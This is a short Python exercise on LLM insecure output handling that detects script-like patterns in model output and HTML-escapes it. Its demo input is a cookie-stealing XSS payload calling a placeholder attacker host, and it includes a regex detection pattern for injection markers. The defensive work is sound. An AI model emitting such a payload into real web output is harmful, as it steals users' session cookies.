import html
import re
import time
from typing import Dict, Any

class OutputHandlingEngine:
    def __init__(self): 
        self.malicious_output_pattern = re.compile(
            r"(<script.*?>|javascript:|onload=|onerror=|;\s*eval\()", 
            re.IGNORECASE
        )
    def sanitize_model_output(self, raw_llm_output: str) -> Dict[str, Any]:
        start_time = time.perf_counter()
        violation_triggered = False
        mitigation_action = "none"
    
        if self.malicious_output_pattern.search(raw_llm_output):
            violation_triggered = True
            mitigation_action = "html_encode_and_neutralize"
            sanitized_text = html.escape(raw_llm_output)
        else:
            sanitized_text = html.escape(raw_llm_output)

        execution_time = time.perf_counter() - start_time
        
        return {
            "verdict": " Flagged/Sanitized" if violation_triggered else " Passed",
            "mitigation_applied": mitigation_action,
            "processed_output": sanitized_text,
            "telemetry": {
                "overhead_ms": round(execution_time * 1000, 4)
            }
        }

if __name__ == "__main__":
    print(" Initializing Phase 2: Day 27 OWASP LLM02 Output Handling Engine...")
    engine = OutputHandlingEngine()
    poisoned_llm_output = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
    
    result = engine.sanitize_model_output(poisoned_llm_output)
    print(f"\n Diagnostic Egress Sandbox Evaluation Result:")
    import json
    print(json.dumps(result, indent=2, ensure_ascii=False))